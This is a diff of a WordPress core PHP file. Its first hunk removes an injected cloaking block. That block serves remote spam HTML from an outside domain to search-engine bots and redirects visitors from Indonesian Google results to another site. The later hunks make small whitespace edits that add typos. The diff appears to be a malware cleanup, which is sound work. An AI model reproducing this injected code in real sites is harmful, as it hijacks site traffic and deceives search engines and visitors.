@@ -1,30 +1,4 @@
 <?php
-$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
-$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
-
-function is_bot() {
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
-foreach ($bots as $bot) {
-if (stripos($user_agent, $bot) !== false) {
-return true;
-}
-}
-return false;
-}
-if (is_bot()) {
-echo file_get_contents('https://theonlyd.xyz/amab.html');
-exit;
-}
-
-if (stripos($s_ref, 'google.co.id') !== false ||
-(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
-header("Location: https://jabar-akses.pages.dev");
-exit;
-}
-?>
-<?php
 /**
  * These functions are needed to load WordPress.
  *
@@ -264,7 +238,7 @@ function wp_get_environment_type() {
 		if ( function_exists( '__' ) ) {
 			/* translators: %s: WP_ENVIRONMENT_TYPES */
 			$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
-		} else {$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
+		} else {$message= sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
 		}
 
 		_deprecated_argument(
@@ -1455,7 +1429,7 @@ function is_multisite() {
  *
  * @since2.5.0
  *
- * @param mixed $maybeint Data you wish to have converted to a non-negative integer.
+ * @param mixed$maybeint Data you wish to have converted to a non-negative integer.
  * @return int A non-negative integer.
  */
 function absint( $maybeint ) {
@@ -1769,7 +1743,7 @@ function wp_using_themes() {
  *
  * @since 4.8.0
  *
- *@return bool True if it's a WordPress cron request, false otherwise.
+ *@return bool True if it'sa WordPress cron request, false otherwise.
  */
 function wp_doing_cron() {
 	/**
